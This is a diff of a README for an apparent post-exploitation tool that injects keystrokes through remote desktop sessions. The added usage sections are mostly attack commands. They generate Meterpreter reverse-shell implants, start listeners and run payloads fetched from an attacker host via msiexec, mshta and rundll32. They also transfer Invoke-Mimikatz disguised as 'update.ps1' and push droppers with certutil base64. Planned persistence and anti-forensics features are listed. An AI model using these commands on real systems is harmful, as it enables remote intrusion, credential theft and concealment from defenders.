@@ -8,6 +8,14 @@ A script to automate keystrokes through an active remote desktop session that as
 
 All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.
 
+## Features
+
+- Executing commands
+- File Transfer
+- Execute C# Implant (Coming soon)
+- Privilege Escalation (Coming soon)
+- Anti-Forensics (Coming soon)
+
 ## Help Menu
 
 ```
@@ -52,27 +60,108 @@ net group "Domain Computers" /domain
 $ ./rks.h -c recon_cmds.txt
 ```
 
+- To execute a single command
+
+`$ ./rks.sh -c "systeminfo"`
+
 ### Execute Implant
 
 - Execute an implant while reading the contents of the payload in powershell.
 
 ```
-$ msfvenom -p windowx/x64/shell_reverse_tcp lhost=<IP> lport=4444 -f psh -o implant.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o implant.ps1
+
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
+
+$ ./rks.sh -c "powershell.exe" -m dialogbox
 
 $ ./rks.sh -c implant.ps1
-
-$ nc -lvnp 4444
 ```
+
+- Execute an implant with `msiexec.exe` while hosting a webserver.
+
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.ps1
+
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
+
+$ sudo python -m http.server 80
+
+$ ./rks.sh -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi
+```
+
+- Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
+
+```
+$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 4444; set srvhost <IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"
+
+$ ./rks.sh -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
+```
+
+- Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
+
+```
+$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 4444; set srvhost <IP>; set file_name implant.dll; set share data; exploit"
+
+$ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0"
+```
+
+- MSBuild
+
+Coming soon
 
 ### File Transfer
 
-- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes.
+- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. However, there is a limitation for handling a large file. The script will you provide suggestion as an alternative if you insist using base64.
 
 ```
-$ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1
+$ ./rks.sh -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
+$ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
+[*] Transferring file...
+[*] Checking one of the lines reaches 3477 character limit
+[-] Character Limit reached!
+[*] Use 'pwshcertutil' as a method instead.
+[*] Terminating program...
 ```
+
+- To transfer droppers you can use certutil base64 especially if it's large. Keep in mind it'll take time depending the size of the file.
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe`
+
+- For powershell.
+
+```
+$ ./rks.sh -c "powershell.exe" -m dialogbox
+
+$ ./rks.sh -i implant.exe -o implant.exe -m pwshcertutil
+```
+
+- For command prompt.
+
+```
+$ ./rks.sh -c "cmd.exe" -m dialogbox
+
+$ ./rks.sh -i implant.exe -o implant.exe -m cmdb64
+```
+
+- Activate your C2 listener and execute the implant
+
+```
+$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"
+
+$ ./rks.sh -c ".\implant.exe"
+
+meterpreter > sysinfo
+```
+
+### Privilege Escalation
+
+TODO: Fill this info after the feature has been implemented
+
+### Anti Forensics
+
+TODO: Fill this info after the feature has been implemented
 
 ### Specify Grapical Remote Software
 
@@ -84,21 +173,21 @@ $ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Win
 
 `$ ./rks.sh -i implant.bat -w rdesktop`
 
+### FAQ
+
+TODO: Fill this info
+
 ## TODO and Help Wanted
 
-- Add text colors for better user experience
+- [ ] Implement Bin2Hex file transfer
 
-- Implement Base64 file transfer
+- [ ] Implement a persistence function for both windows and linux.
 
-- Implement Bin2Hex file transfer
+- [ ] Implement antiforensics function for both windows and linux.
 
-- Implement a persistence function for both windows and linux.
+- [ ] Implement to read shellcode input and run C# implant and powershell runspace
 
-- Implement antiforensics function for both windows and linux.
-
-- Implement to read shellcode input and run C# implant and powershell runspace
-
-- Implement privesc function for both windows and linux
+- [ ] Implement privesc function for both windows and linux
 
 ## References
 
@@ -111,3 +200,7 @@ $ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Win
 ## Credits
 
 - [nopernik](https://github.com/nopernik)
+
+## Disclaimer
+
+- It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes with great responsibility.
